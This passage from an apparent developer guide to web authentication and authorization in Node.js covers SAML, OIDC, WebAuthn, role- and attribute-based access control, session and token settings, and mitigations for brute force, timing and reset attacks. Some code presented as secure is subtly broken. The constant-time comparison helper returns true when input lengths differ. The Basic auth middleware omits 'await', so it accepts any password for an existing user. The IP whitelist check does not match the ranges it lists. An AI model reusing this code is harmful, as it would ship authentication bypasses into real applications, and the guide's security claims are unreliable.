    this.sp.create_login_request_url(this.idp, {}, (err, loginUrl) => {
      if (err) {
        return res.status(500).send(err);
      }
      res.redirect(loginUrl);
    });
  }

  // Handle SAML assertion
  async assertSAML(req, res) {
    const options = { request_body: req.body };

    this.sp.post_assert(this.idp, options, async (err, samlResponse) => {
      if (err) {
        return res.status(500).send(err);
      }

      const user = samlResponse.user;

      // Find or create user
      let dbUser = await db.users.findOne({ email: user.email });
      if (!dbUser) {
        dbUser = await db.users.create({
          email: user.email,
          name: user.name,
          samlId: user.name_id
        });
      }

      // Create session
      req.session.userId = dbUser.id;
      res.redirect('/dashboard');
    });
  }
}
```

### OpenID Connect

```javascript
const { Issuer, generators } = require('openid-client');

class OIDCService {
  static async initialize() {
    const issuer = await Issuer.discover('https://accounts.google.com');

    this.client = new issuer.Client({
      client_id: process.env.OIDC_CLIENT_ID,
      client_secret: process.env.OIDC_CLIENT_SECRET,
      redirect_uris: ['https://myapp.com/callback'],
      response_types: ['code']
    });
  }

  // Generate authorization URL
  static getAuthorizationUrl() {
    const codeVerifier = generators.codeVerifier();
    const codeChallenge = generators.codeChallenge(codeVerifier);
    const state = generators.state();

    const authUrl = this.client.authorizationUrl({
      scope: 'openid email profile',
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state
    });

    return { authUrl, codeVerifier, state };
  }

  // Handle callback
  static async handleCallback(req, codeVerifier) {
    const params = this.client.callbackParams(req);

    const tokenSet = await this.client.callback(
      'https://myapp.com/callback',
      params,
      { code_verifier: codeVerifier }
    );

    const userInfo = await this.client.userinfo(tokenSet.access_token);

    return {
      user: userInfo,
      tokens: tokenSet
    };
  }
}
```

---

## Biometric Authentication

### WebAuthn Implementation

```javascript
const {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse
} = require('@simplewebauthn/server');

class WebAuthnService {
  // Registration: Generate options
  static async generateRegistrationOptions(user) {
    const options = await generateRegistrationOptions({
      rpName: 'My App',
      rpID: 'myapp.com',
      userID: user.id,
      userName: user.username,
      userDisplayName: user.displayName,
      attestationType: 'none',
      authenticatorSelection: {
        residentKey: 'preferred',
        userVerification: 'preferred',
        authenticatorAttachment: 'platform', // or 'cross-platform'
      },
    });

    // Store challenge
    await redis.setex(
      `webauthn:${user.id}:challenge`,
      300, // 5 minutes
      options.challenge
    );

    return options;
  }

  // Registration: Verify response
  static async verifyRegistration(user, response) {
    const expectedChallenge = await redis.get(`webauthn:${user.id}:challenge`);

    const verification = await verifyRegistrationResponse({
      response,
      expectedChallenge,
      expectedOrigin: 'https://myapp.com',
      expectedRPID: 'myapp.com',
    });

    if (verification.verified) {
      // Store credential
      await db.credentials.create({
        userId: user.id,
        credentialID: verification.registrationInfo.credentialID,
        credentialPublicKey: verification.registrationInfo.credentialPublicKey,
        counter: verification.registrationInfo.counter,
      });
    }

    return verification.verified;
  }

  // Authentication: Generate options
  static async generateAuthenticationOptions(user) {
    const credentials = await db.credentials.find({ userId: user.id });

    const options = await generateAuthenticationOptions({
      rpID: 'myapp.com',
      allowCredentials: credentials.map(cred => ({
        id: cred.credentialID,
        type: 'public-key',
      })),
      userVerification: 'preferred',
    });

    await redis.setex(
      `webauthn:${user.id}:challenge`,
      300,
      options.challenge
    );

    return options;
  }

  // Authentication: Verify response
  static async verifyAuthentication(user, response) {
    const expectedChallenge = await redis.get(`webauthn:${user.id}:challenge`);
    const credential = await db.credentials.findOne({
      credentialID: response.id
    });

    const verification = await verifyAuthenticationResponse({
      response,
      expectedChallenge,
      expectedOrigin: 'https://myapp.com',
      expectedRPID: 'myapp.com',
      authenticator: {
        credentialPublicKey: credential.credentialPublicKey,
        credentialID: credential.credentialID,
        counter: credential.counter,
      },
    });

    if (verification.verified) {
      // Update counter
      await db.credentials.update(
        { id: credential.id },
        { counter: verification.authenticationInfo.newCounter }
      );
    }

    return verification.verified;
  }
}

// Client-side (browser)
/*
// Registration
const registrationOptions = await fetch('/webauthn/register/options').then(r => r.json());
const registrationResponse = await navigator.credentials.create({
  publicKey: registrationOptions
});
await fetch('/webauthn/register/verify', {
  method: 'POST',
  body: JSON.stringify(registrationResponse)
});

// Authentication
const authOptions = await fetch('/webauthn/auth/options').then(r => r.json());
const authResponse = await navigator.credentials.get({
  publicKey: authOptions
});
await fetch('/webauthn/auth/verify', {
  method: 'POST',
  body: JSON.stringify(authResponse)
});
*/
```

---

## Authentication Patterns

### 1. Form-Based Authentication

```javascript
app.post('/login', async (req, res) => {
  const { username, password } = req.body;

  // Rate limiting
  const attempts = await redis.incr(`login:attempts:${username}`);
  if (attempts > 5) {
    return res.status(429).json({
      error: 'Too many attempts. Try again later.'
    });
  }
  await redis.expire(`login:attempts:${username}`, 900); // 15 minutes

  // Verify credentials
  const user = await db.users.findOne({ username });
  if (!user || !await verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Clear rate limit on success
  await redis.del(`login:attempts:${username}`);

  // Create session
  req.session.userId = user.id;
  res.json({ message: 'Login successful' });
});
```

### 2. HTTP Basic Authentication

```javascript
function basicAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="My App"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  const credentials = Buffer.from(
    authHeader.substring(6),
    'base64'
  ).toString('utf-8');

  const [username, password] = credentials.split(':');

  // Verify credentials
  const user = db.users.findOne({ username });
  if (!user || !verifyPassword(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  req.user = user;
  next();
}

// Usage
app.get('/api/data', basicAuth, (req, res) => {
  res.json({ data: 'protected' });
});
```

### 3. Certificate-Based Authentication

```javascript
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('server-key.pem'),
  cert: fs.readFileSync('server-cert.pem'),
  ca: fs.readFileSync('ca-cert.pem'),
  requestCert: true,
  rejectUnauthorized: true
};

const server = https.createServer(options, (req, res) => {
  const cert = req.socket.getPeerCertificate();

  if (req.client.authorized) {
    const cn = cert.subject.CN;
    console.log(`Authenticated: ${cn}`);
    res.writeHead(200);
    res.end('Hello ' + cn);
  } else {
    res.writeHead(401);
    res.end('Unauthorized');
  }
});

server.listen(443);
```

### 4. Passwordless Authentication

```javascript
class PasswordlessAuthService {
  // Send magic link
  static async sendMagicLink(email) {
    const user = await db.users.findOne({ email });
    if (!user) {
      // Don't reveal if user exists
      return;
    }

    const token = crypto.randomBytes(32).toString('hex');
    const expires = Date.now() + 15 * 60 * 1000; // 15 minutes

    await redis.setex(
      `magic:${token}`,
      900,
      JSON.stringify({ userId: user.id, expires })
    );

    const magicLink = `https://myapp.com/auth/verify?token=${token}`;

    await emailService.send({
      to: email,
      subject: 'Your login link',
      html: `<a href="${magicLink}">Click here to log in</a>`
    });
  }

  // Verify magic link
  static async verifyMagicLink(token) {
    const data = await redis.get(`magic:${token}`);
    if (!data) {
      throw new Error('Invalid or expired link');
    }

    const { userId, expires } = JSON.parse(data);

    if (Date.now() > expires) {
      await redis.del(`magic:${token}`);
      throw new Error('Link expired');
    }

    await redis.del(`magic:${token}`);
    return userId;
  }
}

// Endpoints
app.post('/auth/passwordless', async (req, res) => {
  const { email } = req.body;
  await PasswordlessAuthService.sendMagicLink(email);
  res.json({ message: 'Check your email for login link' });
});

app.get('/auth/verify', async (req, res) => {
  const { token } = req.query;

  try {
    const userId = await PasswordlessAuthService.verifyMagicLink(token);
    req.session.userId = userId;
    res.redirect('/dashboard');
  } catch (error) {
    res.status(400).send('Invalid or expired link');
  }
});
```

---

## Authorization

Authorization determines what an authenticated user is allowed to do. After verifying identity (authentication), the system must decide what resources and actions the user can access.

### Authorization Models Overview

| Model | Description | Best For | Complexity |
|-------|-------------|----------|------------|
| **RBAC** | Role-Based Access Control | Most applications | ⭐⭐ |
| **ABAC** | Attribute-Based Access Control | Complex policies | ⭐⭐⭐⭐ |
| **ACL** | Access Control Lists | Simple resources | ⭐ |
| **ReBAC** | Relationship-Based Access Control | Social apps | ⭐⭐⭐ |
| **PBAC** | Policy-Based Access Control | Enterprise | ⭐⭐⭐⭐⭐ |

### Role-Based Access Control (RBAC)

Users are assigned roles, and roles have permissions.

**Basic RBAC Implementation:**

```javascript
// Define roles and permissions
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

// User model
const user = {
  id: 1,
  username: 'alice',
  roles: ['editor']
};

// Check permission
function hasPermission(user, permission) {
  return user.roles.some(role =>
    roles[role]?.includes(permission)
  );
}

// Usage
if (hasPermission(user, 'write')) {
  // Allow write operation
}
```

**Database Schema for RBAC:**

```sql
-- Users table
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(255) UNIQUE NOT NULL,
  email VARCHAR(255) UNIQUE NOT NULL
);

-- Roles table
CREATE TABLE roles (
  id SERIAL PRIMARY KEY,
  name VARCHAR(50) UNIQUE NOT NULL,
  description TEXT
);

-- Permissions table
CREATE TABLE permissions (
  id SERIAL PRIMARY KEY,
  name VARCHAR(100) UNIQUE NOT NULL,
  resource VARCHAR(100) NOT NULL,
  action VARCHAR(50) NOT NULL
);

-- User-Role assignment (many-to-many)
CREATE TABLE user_roles (
  user_id INT REFERENCES users(id) ON DELETE CASCADE,
  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
  PRIMARY KEY (user_id, role_id)
);

-- Role-Permission assignment (many-to-many)
CREATE TABLE role_permissions (
  role_id INT REFERENCES roles(id) ON DELETE CASCADE,
  permission_id INT REFERENCES permissions(id) ON DELETE CASCADE,
  PRIMARY KEY (role_id, permission_id)
);
```

**Advanced RBAC with Hierarchical Roles:**

```javascript
class RBACService {
  constructor() {
    // Role hierarchy
    this.roleHierarchy = {
      admin: ['editor', 'viewer'],
      editor: ['viewer'],
      viewer: []
    };

    // Permissions per role
    this.rolePermissions = {
      admin: ['users:*', 'posts:*', 'settings:*'],
      editor: ['posts:read', 'posts:write', 'posts:delete'],
      viewer: ['posts:read']
    };
  }

  // Get all inherited roles
  getInheritedRoles(role) {
    const inherited = [role];
    const children = this.roleHierarchy[role] || [];

    for (const childRole of children) {
      inherited.push(...this.getInheritedRoles(childRole));
    }

    return [...new Set(inherited)];
  }

  // Get all permissions for user
  getUserPermissions(user) {
    const allRoles = user.roles.flatMap(role =>
      this.getInheritedRoles(role)
    );

    const permissions = allRoles.flatMap(role =>
      this.rolePermissions[role] || []
    );

    return [...new Set(permissions)];
  }

  // Check if user has permission
  hasPermission(user, requiredPermission) {
    const userPermissions = this.getUserPermissions(user);

    return userPermissions.some(permission => {
      // Exact match
      if (permission === requiredPermission) return true;

      // Wildcard match (e.g., "posts:*" matches "posts:read")
      if (permission.endsWith(':*')) {
        const prefix = permission.slice(0, -2);
        return requiredPermission.startsWith(prefix);
      }

      return false;
    });
  }
}

// Usage
const rbac = new RBACService();
const user = { roles: ['editor'] };

console.log(rbac.hasPermission(user, 'posts:write')); // true
console.log(rbac.hasPermission(user, 'users:delete')); // false
```

**Express Middleware for RBAC:**

```javascript
function requireRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const hasRole = req.user.roles.some(role =>
      allowedRoles.includes(role)
    );

    if (!hasRole) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}

function requirePermission(...requiredPermissions) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }

    const rbac = new RBACService();
    const hasPermission = requiredPermissions.every(permission =>
      rbac.hasPermission(req.user, permission)
    );

    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
}

// Routes
app.get('/admin/users', requireRole('admin'), (req, res) => {
  res.json({ users: [] });
});

app.delete('/posts/:id', requirePermission('posts:delete'), (req, res) => {
  res.json({ success: true });
});
```

### Attribute-Based Access Control (ABAC)

Permissions based on attributes of the user, resource, action, and environment.

```javascript
class ABACService {
  // Define policies
  static policies = [
    {
      name: 'Allow owner to edit their posts',
      effect: 'allow',
      condition: (context) => {
        return context.user.id === context.resource.ownerId &&
               context.action === 'edit';
      }
    },
    {
      name: 'Allow managers to edit posts in their department',
      effect: 'allow',
      condition: (context) => {
        return context.user.role === 'manager' &&
               context.user.department === context.resource.department &&
               context.action === 'edit';
      }
    },
    {
      name: 'Block editing during maintenance',
      effect: 'deny',
      condition: (context) => {
        return context.environment.maintenanceMode &&
               ['edit', 'delete'].includes(context.action);
      }
    },
    {
      name: 'Allow reading published posts',
      effect: 'allow',
      condition: (context) => {
        return context.resource.status === 'published' &&
               context.action === 'read';
      }
    }
  ];

  // Evaluate access
  static evaluateAccess(context) {
    let decision = 'deny'; // Default deny

    for (const policy of this.policies) {
      if (policy.condition(context)) {
        if (policy.effect === 'deny') {
          return 'deny'; // Explicit deny overrides allows
        }
        decision = 'allow';
      }
    }

    return decision;
  }

  // Check if user can perform action
  static canAccess(user, resource, action, environment = {}) {
    const context = { user, resource, action, environment };
    return this.evaluateAccess(context) === 'allow';
  }
}

// Usage
const user = {
  id: 123,
  role: 'manager',
  department: 'engineering'
};

const post = {
  id: 456,
  ownerId: 789,
  department: 'engineering',
  status: 'published'
};

const canEdit = ABACService.canAccess(user, post, 'edit');
console.log(canEdit); // true (manager in same department)

// With environment context
const canEditDuringMaintenance = ABACService.canAccess(
  user,
  post,
  'edit',
  { maintenanceMode: true }
);
console.log(canEditDuringMaintenance); // false (maintenance block)
```

**Complex ABAC Policy Engine:**

```javascript
class PolicyEngine {
  constructor() {
    this.policies = [];
  }

  addPolicy(policy) {
    this.policies.push(policy);
  }

  evaluate(request) {
    const { subject, resource, action, context } = request;

    // Check all policies
    const results = this.policies.map(policy => ({
      policy: policy.name,
      effect: policy.evaluate(subject, resource, action, context)
    }));

    // Deny if any policy explicitly denies
    if (results.some(r => r.effect === 'deny')) {
      return { decision: 'deny', reason: 'Explicit deny' };
    }

    // Allow if at least one policy allows
    if (results.some(r => r.effect === 'allow')) {
      return { decision: 'allow' };
    }

    // Default deny
    return { decision: 'deny', reason: 'No matching allow policy' };
  }
}

// Define complex policies
const ownerPolicy = {
  name: 'resource-owner',
  evaluate: (subject, resource, action) => {
    if (subject.id === resource.ownerId) {
      return 'allow';
    }
    return 'neutral';
  }
};

const timePolicy = {
  name: 'business-hours',
  evaluate: (subject, resource, action, context) => {
    const hour = new Date().getHours();
    if (hour < 9 || hour > 17) {
      return 'deny';
    }
    return 'neutral';
  }
};

const ipPolicy = {
  name: 'ip-whitelist',
  evaluate: (subject, resource, action, context) => {
    const allowedIPs = ['192.168.1.0/24', '10.0.0.0/8'];
    if (allowedIPs.some(ip => context.ipAddress.startsWith(ip.split('/')[0]))) {
      return 'allow';
    }
    return 'neutral';
  }
};

// Use policy engine
const engine = new PolicyEngine();
engine.addPolicy(ownerPolicy);
engine.addPolicy(timePolicy);
engine.addPolicy(ipPolicy);

const decision = engine.evaluate({
  subject: { id: 123, role: 'user' },
  resource: { id: 456, ownerId: 123 },
  action: 'edit',
  context: { ipAddress: '192.168.1.100' }
});
```

### Access Control Lists (ACL)

Direct mapping of users/groups to resource permissions.

```javascript
class ACLService {
  constructor() {
    // ACL storage: resource -> user -> permissions
    this.acls = new Map();
  }

  // Grant permission
  grant(resourceId, userId, permission) {
    if (!this.acls.has(resourceId)) {
      this.acls.set(resourceId, new Map());
    }

    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL.has(userId)) {
      resourceACL.set(userId, new Set());
    }

    resourceACL.get(userId).add(permission);
  }

  // Revoke permission
  revoke(resourceId, userId, permission) {
    const resourceACL = this.acls.get(resourceId);
    if (resourceACL?.has(userId)) {
      resourceACL.get(userId).delete(permission);
    }
  }

  // Check permission
  isAllowed(resourceId, userId, permission) {
    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL) return false;

    const userPermissions = resourceACL.get(userId);
    if (!userPermissions) return false;

    return userPermissions.has(permission) ||
           userPermissions.has('*'); // Wildcard
  }

  // Get all permissions for user on resource
  getPermissions(resourceId, userId) {
    const resourceACL = this.acls.get(resourceId);
    return Array.from(resourceACL?.get(userId) || []);
  }

  // Get all users with access to resource
  getUsers(resourceId) {
    const resourceACL = this.acls.get(resourceId);
    if (!resourceACL) return [];

    return Array.from(resourceACL.keys());
  }
}

// Usage
const acl = new ACLService();

// Grant permissions
acl.grant('document:123', 'user:alice', 'read');
acl.grant('document:123', 'user:alice', 'write');
acl.grant('document:123', 'user:bob', 'read');

// Check permissions
console.log(acl.isAllowed('document:123', 'user:alice', 'write')); // true
console.log(acl.isAllowed('document:123', 'user:bob', 'write')); // false

// Revoke permission
acl.revoke('document:123', 'user:alice', 'write');
```

**Database Schema for ACL:**

```sql
CREATE TABLE acl_entries (
  id SERIAL PRIMARY KEY,
  resource_type VARCHAR(50) NOT NULL,
  resource_id VARCHAR(255) NOT NULL,
  principal_type VARCHAR(50) NOT NULL, -- 'user' or 'group'
  principal_id VARCHAR(255) NOT NULL,
  permission VARCHAR(100) NOT NULL,
  granted BOOLEAN DEFAULT true,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  UNIQUE(resource_type, resource_id, principal_type, principal_id, permission)
);

CREATE INDEX idx_acl_resource ON acl_entries(resource_type, resource_id);
CREATE INDEX idx_acl_principal ON acl_entries(principal_type, principal_id);
```

### Relationship-Based Access Control (ReBAC)

Authorization based on relationships between users and resources (e.g., "owner", "collaborator", "follower").

```javascript
class ReBAC {
  constructor() {
    // Store relationships: subject -> relation -> object
    this.relationships = new Map();
  }

  // Add relationship
  addRelation(subject, relation, object) {
    const key = `${subject}:${relation}`;
    if (!this.relationships.has(key)) {
      this.relationships.set(key, new Set());
    }
    this.relationships.get(key).add(object);
  }

  // Check relationship
  hasRelation(subject, relation, object) {
    const key = `${subject}:${relation}`;
    return this.relationships.get(key)?.has(object) || false;
  }

  // Check if user can perform action
  can(user, action, resource) {
    // Define rules
    const rules = {
      'read': ['owner', 'collaborator', 'viewer'],
      'write': ['owner', 'collaborator'],
      'delete': ['owner'],
      'share': ['owner']
    };

    const requiredRelations = rules[action];
    if (!requiredRelations) return false;

    return requiredRelations.some(relation =>
      this.hasRelation(user, relation, resource)
    );
  }

  // Get all objects user has relation with
  getRelated(subject, relation) {
    const key = `${subject}:${relation}`;
    return Array.from(this.relationships.get(key) || []);
  }
}

// Usage
const rebac = new ReBAC();

// Define relationships
rebac.addRelation('user:alice', 'owner', 'doc:123');
rebac.addRelation('user:bob', 'collaborator', 'doc:123');
rebac.addRelation('user:charlie', 'viewer', 'doc:123');

// Check permissions
console.log(rebac.can('user:alice', 'delete', 'doc:123')); // true
console.log(rebac.can('user:bob', 'write', 'doc:123')); // true
console.log(rebac.can('user:charlie', 'write', 'doc:123')); // false
```

### OAuth 2.0 Scopes

OAuth uses scopes for fine-grained authorization.

```javascript
class ScopeAuthorization {
  // Define scope hierarchy
  static scopeHierarchy = {
    'admin': ['read', 'write', 'delete'],
    'write': ['read'],
    'read': []
  };

  // Check if token has required scope
  static hasScope(tokenScopes, requiredScope) {
    // Check exact match
    if (tokenScopes.includes(requiredScope)) {
      return true;
    }

    // Check if any token scope includes required scope
    return tokenScopes.some(tokenScope => {
      const inherited = this.scopeHierarchy[tokenScope] || [];
      return inherited.includes(requiredScope);
    });
  }

  // Middleware
  static requireScope(...requiredScopes) {
    return (req, res, next) => {
      const token = req.user?.token;
      if (!token) {
        return res.status(401).json({ error: 'No token' });
      }

      const hasAllScopes = requiredScopes.every(scope =>
        this.hasScope(token.scopes, scope)
      );

      if (!hasAllScopes) {
        return res.status(403).json({
          error: 'Insufficient scopes',
          required: requiredScopes,
          provided: token.scopes
        });
      }

      next();
    };
  }
}

// Usage
app.get('/api/data',
  authenticateJWT,
  ScopeAuthorization.requireScope('read'),
  (req, res) => {
    res.json({ data: [] });
  }
);

app.post('/api/data',
  authenticateJWT,
  ScopeAuthorization.requireScope('write'),
  (req, res) => {
    res.json({ success: true });
  }
);
```

### Authorization Best Practices

```javascript
// 1. Principle of Least Privilege
// Grant minimal permissions needed
const minimalPermissions = ['posts:read'];
const excessivePermissions = ['posts:*', 'users:*', 'settings:*']; // ❌

// 2. Deny by Default
function checkAccess(user, resource, action) {
  // Default deny
  let allowed = false;

  // Explicit checks
  if (user.isOwner(resource)) allowed = true;
  if (user.hasPermission(action)) allowed = true;

  return allowed;
}

// 3. Centralized Authorization
class AuthorizationService {
  static async authorize(user, action, resource) {
    // Single point for all authorization logic
    const policies = await this.loadPolicies();
    return this.evaluate(policies, user, action, resource);
  }
}

// 4. Audit Authorization Decisions
async function authorizeWithAudit(user, action, resource) {
  const decision = await authorize(user, action, resource);

  await auditLog.record({
    timestamp: new Date(),
    userId: user.id,
    action,
    resource,
    decision,
    reason: decision.reason
  });

  return decision;
}

// 5. Separate Authorization from Business Logic
// ❌ Bad
app.post('/posts/:id/delete', async (req, res) => {
  const post = await Post.findById(req.params.id);
  if (req.user.id !== post.ownerId && !req.user.roles.includes('admin')) {
    return res.status(403).send('Forbidden');
  }
  await post.delete();
});

// ✅ Good
app.post('/posts/:id/delete',
  authorize('posts:delete'),
  async (req, res) => {
    const post = await Post.findById(req.params.id);
    await post.delete();
  }
);
```

---

## Security Best Practices

### 1. Password Security

```javascript
// Strong password requirements
const PASSWORD_REQUIREMENTS = {
  minLength: 12,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true,
  preventCommonPasswords: true,
  preventUserInfo: true  // Don't allow username in password
};

// Password hashing
const BCRYPT_ROUNDS = 12; // or use Argon2
```

### 2. Account Lockout

```javascript
class AccountLockoutService {
  static async recordFailedAttempt(username) {
    const key = `lockout:${username}`;
    const attempts = await redis.incr(key);
    await redis.expire(key, 900); // 15 minutes

    if (attempts >= 5) {
      await this.lockAccount(username);
    }

    return attempts;
  }

  static async lockAccount(username) {
    await db.users.update(
      { username },
      {
        locked: true,
        lockedUntil: new Date(Date.now() + 30 * 60 * 1000) // 30 min
      }
    );
  }

  static async checkLocked(username) {
    const user = await db.users.findOne({ username });

    if (user.locked && user.lockedUntil > new Date()) {
      return true;
    }

    // Auto-unlock
    if (user.locked && user.lockedUntil <= new Date()) {
      await db.users.update(
        { username },
        { locked: false, lockedUntil: null }
      );
    }

    return false;
  }
}
```

### 3. Secure Session Configuration

```javascript
const sessionConfig = {
  // Use secure cookie settings
  cookie: {
    secure: true,           // HTTPS only
    httpOnly: true,         // Prevent XSS
    sameSite: 'strict',     // CSRF protection
    maxAge: 3600000,        // 1 hour
    domain: '.myapp.com'    // Explicit domain
  },

  // Session security
  secret: process.env.SESSION_SECRET, // Strong random secret
  resave: false,
  saveUninitialized: false,
  rolling: true,            // Reset expiry on activity

  // Use secure storage
  store: new RedisStore({
    client: redisClient,
    prefix: 'sess:',
    ttl: 3600
  })
};
```

### 4. Token Security

```javascript
// JWT best practices
const JWT_CONFIG = {
  // Short-lived access tokens
  accessTokenExpiry: '15m',

  // Longer-lived refresh tokens
  refreshTokenExpiry: '7d',

  // Strong secrets
  accessTokenSecret: process.env.JWT_SECRET,  // 256-bit+
  refreshTokenSecret: process.env.JWT_REFRESH_SECRET,

  // Algorithm
  algorithm: 'RS256',  // Use asymmetric when possible

  // Claims
  issuer: 'myapp.com',
  audience: 'myapp-api'
};

// Token rotation
async function rotateRefreshToken(oldToken) {
  // Verify old token
  const payload = jwt.verify(oldToken, JWT_CONFIG.refreshTokenSecret);

  // Revoke old token
  await redis.setex(`revoked:${oldToken}`, 604800, '1');

  // Issue new token
  return generateRefreshToken(payload.userId);
}
```

### 5. Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// Login rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulRequests: true
});

// API rate limiting
const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  keyGenerator: (req) => req.user?.id || req.ip
});

app.post('/login', loginLimiter, loginHandler);
app.use('/api', apiLimiter);
```

### 6. Audit Logging

```javascript
class AuditLogger {
  static async logAuthEvent(event, userId, details) {
    await db.auditLogs.create({
      timestamp: new Date(),
      event,
      userId,
      ip: details.ip,
      userAgent: details.userAgent,
      success: details.success,
      metadata: details.metadata
    });
  }

  // Log events
  static async logLogin(userId, req, success) {
    await this.logAuthEvent('LOGIN', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success
    });
  }

  static async logPasswordChange(userId, req) {
    await this.logAuthEvent('PASSWORD_CHANGE', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success: true
    });
  }

  static async log2FAEnabled(userId, req) {
    await this.logAuthEvent('2FA_ENABLED', userId, {
      ip: req.ip,
      userAgent: req.get('user-agent'),
      success: true
    });
  }
}
```

---

## Common Vulnerabilities

### 1. Credential Stuffing

**Attack:** Automated login attempts using leaked credentials

**Mitigation:**
```javascript
// Implement CAPTCHA after failed attempts
async function checkCaptcha(req) {
  const attempts = await redis.get(`login:attempts:${req.ip}`);

  if (attempts && attempts > 3) {
    if (!req.body.captcha) {
      throw new Error('CAPTCHA required');
    }

    const isValid = await verifyCaptcha(req.body.captcha);
    if (!isValid) {
      throw new Error('Invalid CAPTCHA');
    }
  }
}

// Device fingerprinting
async function checkDeviceFingerprint(userId, fingerprint) {
  const knownDevices = await db.devices.find({ userId });

  if (!knownDevices.some(d => d.fingerprint === fingerprint)) {
    // New device - require additional verification
    await sendVerificationEmail(userId);
    return false;
  }

  return true;
}
```

### 2. Session Fixation

**Attack:** Attacker sets user's session ID

**Mitigation:**
```javascript
// Regenerate session ID after login
app.post('/login', async (req, res) => {
  // ... authenticate user ...

  // Regenerate session
  const oldSessionData = req.session;
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).send('Login failed');
    }

    // Restore data
    Object.assign(req.session, oldSessionData);
    req.session.userId = user.id;

    res.json({ success: true });
  });
});
```

### 3. Brute Force Attacks

**Attack:** Trying many password combinations

**Mitigation:**
```javascript
class BruteForceProtection {
  static async checkAttempts(identifier) {
    const key = `brute:${identifier}`;
    const attempts = await redis.get(key) || 0;

    if (attempts >= 10) {
      const ttl = await redis.ttl(key);
      throw new Error(`Too many attempts. Try again in ${ttl} seconds`);
    }

    return parseInt(attempts);
  }

  static async recordAttempt(identifier, success) {
    const key = `brute:${identifier}`;

    if (success) {
      await redis.del(key);
    } else {
      const attempts = await redis.incr(key);

      // Exponential backoff
      if (attempts === 1) {
        await redis.expire(key, 60); // 1 minute
      } else if (attempts === 5) {
        await redis.expire(key, 300); // 5 minutes
      } else if (attempts >= 10) {
        await redis.expire(key, 3600); // 1 hour
      }
    }
  }
}
```

### 4. Password Reset Vulnerabilities

**Attack:** Token prediction, token reuse, no expiration

**Mitigation:**
```javascript
class SecurePasswordReset {
  static async createResetToken(email) {
    const user = await db.users.findOne({ email });
    if (!user) {
      // Don't reveal if user exists
      return null;
    }

    // Cryptographically secure token
    const token = crypto.randomBytes(32).toString('hex');

    // Hash token before storage
    const hash = crypto.createHash('sha256').update(token).digest('hex');

    // Invalidate previous tokens
    await db.passwordResets.deleteMany({ userId: user.id });

    // Store with expiration
    await db.passwordResets.create({
      userId: user.id,
      tokenHash: hash,
      expires: new Date(Date.now() + 3600000), // 1 hour
      used: false
    });

    return token;
  }

  static async verifyResetToken(token) {
    const hash = crypto.createHash('sha256').update(token).digest('hex');

    const reset = await db.passwordResets.findOne({
      tokenHash: hash,
      expires: { $gt: new Date() },
      used: false
    });

    if (!reset) {
      throw new Error('Invalid or expired token');
    }

    return reset;
  }

  static async resetPassword(token, newPassword) {
    const reset = await this.verifyResetToken(token);

    // Hash new password
    const hashedPassword = await hashPassword(newPassword);

    // Update password
    await db.users.update(
      { id: reset.userId },
      { password: hashedPassword }
    );

    // Mark token as used
    await db.passwordResets.update(
      { id: reset.id },
      { used: true }
    );

    // Invalidate all sessions
    await db.sessions.deleteMany({ userId: reset.userId });

    return true;
  }
}
```

### 5. Timing Attacks

**Attack:** Measuring response time to gain information

**Mitigation:**
```javascript
const crypto = require('crypto');

// Constant-time string comparison
function timingSafeEqual(a, b) {
  if (a.length !== b.length) {
    // Still compare to prevent timing leak
    b = a;
  }

  return crypto.timingSafeEqual(
    Buffer.from(a),
    Buffer.from(b)
  );
}

// Constant-time user lookup and password check
async function authenticateUser(username, password) {
  // Always perform lookup
  const user = await db.users.findOne({ username }) || {
    password: await bcrypt.hash('dummy', 12)
  };

  // Always perform comparison
  const isValid = await bcrypt.compare(password, user.password);

  if (!user.id || !isValid) {
    throw new Error('Invalid credentials');
  }

  return user;
}
```

---

## Resources

**Specifications & Standards:**
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [OAuth 2.0 RFC 6749](https://tools.ietf.org/html/rfc6749)
- [OpenID Connect Core](https://openid.net/specs/openid-connect-core-1_0.html)
- [WebAuthn W3C Recommendation](https://www.w3.org/TR/webauthn/)

**Security Guidelines:**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
- [Mozilla Web Security](https://infosec.mozilla.org/guidelines/web_security)

**Tools & Libraries:**
- [Passport.js](http://www.passportjs.org/) - Authentication middleware
- [bcrypt](https://github.com/kelektiv/node.bcrypt.js) - Password hashing
- [jsonwebtoken](https://github.com/auth0/node-jsonwebtoken) - JWT implementation
